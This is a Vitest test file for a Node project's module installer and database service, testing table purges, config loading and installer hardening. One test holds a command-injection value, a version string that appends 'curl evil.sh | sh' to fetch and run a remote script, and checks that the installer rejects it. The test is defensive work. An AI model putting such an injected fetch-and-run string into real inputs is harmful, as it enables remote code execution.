import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { loadConfig, saveConfig } from '@/registry/nano-config.js';
import {
  DatabaseService,
  moduleTablePrefix
} from '@/services/database.js';
import { installExternal, installFromStore } from '@/store/installer.js';
import type { StoreClient, StoreModule } from '@/store/store-client.js';
import { ok } from '@/types/nano-result.js';

import * as nano_barrel from '@ccs-devhub/nano-core';

function openDatabase(): DatabaseService {
  const ROOT = mkdtempSync(join(tmpdir(), 'nano-safety-'));
  const RESULT = DatabaseService.open({}, ROOT);

  if (!RESULT.ok) {
    throw new Error(RESULT.error);
  }
  return RESULT.data;
}

function rawClient(service: DatabaseService): {
  exec(sql: string): void;
  tables(): string[];
  count(table: string): number;
} {
  const CLIENT = (service.getDb() as unknown as {
    $client: {
      exec(sql: string): void;
      prepare(sql: string): {
        all(): { name: string }[];
        get(): { n: number };
      };
    };
  }).$client;

  return {
    exec: (sql: string): void => {
      CLIENT.exec(sql);
    },
    tables: (): string[] => {
      return CLIENT
        .prepare(
          "SELECT name FROM sqlite_master WHERE type = 'table' " +
          "AND name LIKE 'mod%' ORDER BY name"
        )
        .all()
        .map((row: { name: string }): string => {
          return row.name;
        });
    },
    count: (table: string): number => {
      return CLIENT.prepare(`SELECT COUNT(*) AS n FROM "${table}"`)
        .get().n;
    },
  };
}

function fakeStoreClient(module: StoreModule): StoreClient {
  return {
    resolve: async (): Promise<ReturnType<never>> => {
      return ok(module) as never;
    },
  } as unknown as StoreClient;
}

function npmModule(overrides: Partial<StoreModule>): StoreModule {
  return {
    name: 'clean-module',
    description: 'd',
    author: 'a',
    source: 'npm',
    package: 'clean-module',
    version: '1.0.0',
    validated_at: '2026-01-01',
    ...overrides,
  };
}

describe('DB8 purge escape', (): void => {
  it('purges only the exact module prefix', (): void => {
    const SERVICE = openDatabase();
    const RAW = rawClient(SERVICE);
    RAW.exec('CREATE TABLE mod_leveling_xp (v)');
    RAW.exec('CREATE TABLE mod_levelingpro_xp (v)');

    const RESULT = SERVICE.purgeModuleData('leveling');

    expect(RESULT.ok).toBe(true);

    if (RESULT.ok) {
      expect(RESULT.data).toEqual(['mod_leveling_xp']);
    }

    expect(RAW.tables()).toEqual(['mod_levelingpro_xp']);
    SERVICE.close();
  });
});

describe('DB2-11 purgeGuildData', (): void => {
  it('deletes one guild\'s rows from guild-keyed tables only',
    (): void => {
      const SERVICE = openDatabase();
      const RAW = rawClient(SERVICE);
      RAW.exec('CREATE TABLE mod_roles_grants (guild_id, v)');
      RAW.exec('CREATE TABLE mod_roles_meta (v)');
      RAW.exec(
        "INSERT INTO mod_roles_grants VALUES ('g1', 1), ('g2', 2)"
      );
      RAW.exec('INSERT INTO mod_roles_meta VALUES (9)');

      const RESULT = SERVICE.purgeGuildData('g1');

      expect(RESULT.ok).toBe(true);

      if (RESULT.ok) {
        expect(RESULT.data).toContain('mod_roles_grants');
        expect(RESULT.data).toContain('nano_guild_config');
        expect(RESULT.data).not.toContain('mod_roles_meta');
      }

      expect(RAW.count('mod_roles_grants')).toBe(1);
      expect(RAW.count('mod_roles_meta')).toBe(1);
      SERVICE.close();
    });
});

describe('DB2-2 prefix-collision rejection', (): void => {
  it('rejects an install whose id mangles to a taken prefix',
    (): void => {
      const ROOT = mkdtempSync(join(tmpdir(), 'nano-collide-'));
      const CONFIG = loadConfig(ROOT);
      CONFIG.modules.push({
        name: 'a-b',
        source: 'local',
        spec: './a-b',
      });
      saveConfig(CONFIG, ROOT);
      mkdirSync(join(ROOT, 'a_b'));

      const RESULT = installExternal('./a_b', true, { root: ROOT });

      expect(RESULT.ok).toBe(false);

      if (!RESULT.ok) {
        expect(RESULT.error).toContain(moduleTablePrefix('a_b'));
      }
    });
});

describe('EX4/GR9 installer hardening', (): void => {
  it('rejects unsafe registry strings before any shell runs',
    async (): Promise<void> => {
      const COMMANDS: string[] = [];
      const EXEC = (command: string): string => {
        COMMANDS.push(command);
        return '';
      };
      const ROOT = mkdtempSync(join(tmpdir(), 'nano-evil-'));
      const EVIL = npmModule({
        name: 'clean-module',
        version: '1.0.0; curl evil.sh | sh',
      });

      const RESULT = await installFromStore(
        fakeStoreClient(EVIL),
        'clean-module',
        { root: ROOT, exec: EXEC }
      );

      expect(RESULT.ok).toBe(false);
      expect(COMMANDS).toEqual([]);
    });

  it('installs store npm modules with --ignore-scripts', async ():
  Promise<void> => {
    const COMMANDS: string[] = [];
    const EXEC = (command: string): string => {
      COMMANDS.push(command);
      return '';
    };
    const ROOT = mkdtempSync(join(tmpdir(), 'nano-clean-'));

    const RESULT = await installFromStore(
      fakeStoreClient(npmModule({})),
      'clean-module',
      { root: ROOT, exec: EXEC }
    );

    expect(RESULT.ok).toBe(true);
    expect(COMMANDS[0]).toContain('--ignore-scripts');
  });
});

describe('GR12 unreadable config fails loudly', (): void => {
  it('throws on a truncated existing config file', (): void => {
    const ROOT = mkdtempSync(join(tmpdir(), 'nano-trunc-'));
    writeFileSync(join(ROOT, 'nano.config.json'), '{ "bot": { "na');

    expect((): void => {
      loadConfig(ROOT);
    }).toThrow(/Unreadable/);
  });

  it('still defaults when no file exists at all', (): void => {
    const ROOT = mkdtempSync(join(tmpdir(), 'nano-fresh-'));

    expect(loadConfig(ROOT).bot.name).toBe('nano-bot');
  });
});

describe('GR5 the barrel exposes no config writers', (): void => {
  it('keeps the read surface and drops every writer', (): void => {
    const SURFACE = nano_barrel as Record<string, unknown>;

    expect(typeof SURFACE.loadConfig).toBe('function');
    expect(typeof SURFACE.getModuleConfig).toBe('function');
    expect(SURFACE.saveConfig).toBeUndefined();
    expect(SURFACE.setModuleState).toBeUndefined();
    expect(SURFACE.addModuleEntry).toBeUndefined();
    expect(SURFACE.removeModuleEntry).toBeUndefined();
    expect(SURFACE.setModuleConfig).toBeUndefined();
  });
});
